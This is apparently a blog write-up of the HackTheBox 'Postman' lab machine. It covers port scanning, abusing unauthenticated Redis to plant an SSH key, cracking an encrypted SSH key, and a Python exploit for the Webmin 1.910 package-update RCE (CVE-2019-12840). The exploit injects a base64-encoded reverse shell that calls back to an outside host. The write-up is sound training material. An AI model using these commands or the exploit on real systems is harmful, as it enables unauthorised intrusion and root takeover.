---
title: "HTB - Postman"
date: 2026-03-03
draft: false
tags: ["CTF", "HackTheBox", "Linux", "Webmin", "Redis", "Easy"]
description: "Writeup for the Postman machine from HackTheBox. Covers Redis exploitation for initial access, SSH key cracking, and Webmin RCE for privilege escalation."
---

# Enumeration

Running a full port scan reveals four open ports: SSH (22), HTTP (80), Redis (6379), and Webmin (10000).

```bash
# Nmap 7.98 scan initiated Tue Mar  3 16:11:31 2026
# nmap -sS -sCV -p22,80,6379,10000 --min-rate 5000 -n -Pn -oN VersionScan 10.129.2.1

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80 - HTTP

Opening the page in the browser we find a basic personal website.

![Port 80 - Main page](images/Puerto80.png)

### Directory Enumeration

Running `gobuster` we find an `uploads` directory, but nothing useful inside.

![Gobuster results](images/gobuster.png)

## Port 10000 - Webmin

Navigating to port 10000 we find a Webmin login panel. We'll come back to this later.

![Port 10000 - Webmin login](images/webmin.png)

## Port 6379 - Redis

Redis is running unauthenticated. We can abuse this to write our SSH public key into the `authorized_keys` file of the `redis` user.

```bash
# Generate SSH key pair and prepare it
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > spaced_key.txt

# Write the key into Redis
cat spaced_key.txt | redis-cli -h 10.129.2.1 -x set kryonesp

# Configure Redis to write into the .ssh directory
redis-cli -h 10.129.2.1
10.129.2.1:6379> config set dir /var/lib/redis/.ssh/
10.129.2.1:6379> config set dbfilename "authorized_keys"
10.129.2.1:6379> save

# Connect via SSH
ssh redis@10.129.2.1 -i id_rsa
```

We now have a shell as the `redis` user.

```
redis@Postman:~$
```

---

# Exploitation

## Finding Matt's SSH Key

While exploring the machine, we find an encrypted RSA private key in `/opt`.

![RSA key found in /opt](images/ls_id_rsa.png)

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
...
-----END RSA PRIVATE KEY-----
```

## Cracking the Key

We use `ssh2john` to convert the key and then crack it with `john`.

![Cracking Matt's key](images/matt_passwd.png)

The passphrase is `computer2008`. Since SSH login as Matt fails, we switch to the user locally:

```bash
su Matt
# password: computer2008
```

![User flag](images/user_flag.png)

---

# Privilege Escalation

## Webmin RCE (CVE-2019-12840)

Logging into the Webmin panel at port 10000 with Matt's credentials works.

![Webmin authenticated](images/webmin_info.png)

The page title reveals the version: **Webmin 1.910**. This version is vulnerable to an authenticated Remote Code Execution via the package update functionality.

![Webmin version](images/webmin_version.png)

We adapt an existing exploit to send a malicious request and obtain a reverse shell:

```python
from pwn import *
import requests, urllib3, sys, signal

def signal_handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

LOGIN_URL  = "https://10.129.2.1:10000/session_login.cgi"
UPDATE_URL = "https://10.129.2.1:10000/package-updates/update.cgi"

def exploit():
    urllib3.disable_warnings()
    s = requests.Session()
    s.verify = False

    # Authenticate as Matt
    s.post(LOGIN_URL, data={"user": "Matt", "pass": "computer2008"},
           headers={"Cookie": "redirect=1; testing=1; sid=x"})

    # Inject reverse shell via package update
    payload = '| bash -c "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjY4LzQ0MyAwPiYx | base64 -d | bash"'
    post_data = [
        ("u", "acl/apt"),
        ("u", payload),
        ("ok_top", "Update Selected Packages")
    ]

    s.post(UPDATE_URL, data=post_data,
           headers={"Referer": "https://10.129.2.1:10000/package-updates/?xnavigation=1"})

if __name__ == "__main__":
    exploit()
```

We get a shell as `root` and can read the flag.

![Root flag](images/root_flag.png)